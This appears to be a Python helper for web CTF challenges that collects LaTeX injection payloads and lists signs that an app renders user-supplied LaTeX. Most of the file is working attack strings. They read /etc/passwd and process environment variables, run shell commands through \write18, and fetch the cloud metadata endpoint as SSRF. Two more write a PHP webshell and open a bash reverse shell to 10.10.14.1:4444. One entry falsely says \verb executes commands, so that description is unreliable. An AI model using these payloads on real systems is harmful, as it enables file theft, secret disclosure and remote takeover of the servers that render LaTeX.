"""
LaTeX Injection Payload Crafter for Web CTF.
Covers LaTeX command injection for file read, command execution, and SSRF.
"""

from typing import List, Dict


def get_latex_payloads() -> List[Dict[str, str]]:
    """Generate LaTeX injection payloads."""
    return [
        {
            "name": "File Read (input)",
            "payload": "\\input{/etc/passwd}",
            "desc": "Reads arbitrary file via \\input command."
        },
        {
            "name": "File Read (include)",
            "payload": "\\include{/etc/passwd}",
            "desc": "Reads arbitrary file via \\include command."
        },
        {
            "name": "File Read (lstinputlisting)",
            "payload": "\\lstinputlisting{/etc/passwd}",
            "desc": "Reads arbitrary file via \\lstinputlisting."
        },
        {
            "name": "Command Execution (write18)",
            "payload": "\\immediate\\write18{id}",
            "desc": "Executes system command via \\write18 (shell escape)."
        },
        {
            "name": "Command Execution (verbatim)",
            "payload": "\\verb|id|",
            "desc": "Executes command via \\verb."
        },
        {
            "name": "Command Execution (bash)",
            "payload": "\\immediate\\write18{bash -c 'id'}",
            "desc": "Executes bash command via \\write18."
        },
        {
            "name": "SSRF via LaTeX",
            "payload": "\\input{http://169.254.169.254/latest/meta-data/}",
            "desc": "SSRF via \\input to fetch internal URLs."
        },
        {
            "name": "Environment Variable Disclosure",
            "payload": "\\input{/proc/self/environ}",
            "desc": "Reads process environment via \\input."
        },
        {
            "name": "File Write via LaTeX",
            "payload": "\\newwrite\\out\\immediate\\openout\\out=shell.php\\immediate\\write\\out{<?php system($_GET[cmd]); ?>}",
            "desc": "Writes webshell via LaTeX file write."
        },
        {
            "name": "Reverse Shell via LaTeX",
            "payload": "\\immediate\\write18{bash -i >& /dev/tcp/10.10.14.1/4444 0>&1}",
            "desc": "Reverse shell via \\write18."
        }
    ]


def get_latex_indicators() -> List[Dict[str, str]]:
    """Indicators that LaTeX injection is possible."""
    return [
        {
            "indicator": "LaTeX rendering feature",
            "desc": "If the app renders LaTeX (e.g. math equations, PDF generation)."
        },
        {
            "indicator": "User-controlled LaTeX",
            "desc": "If the app allows user-controlled LaTeX input."
        },
        {
            "indicator": "PDF generation",
            "desc": "If the app generates PDFs from LaTeX."
        }
    ]
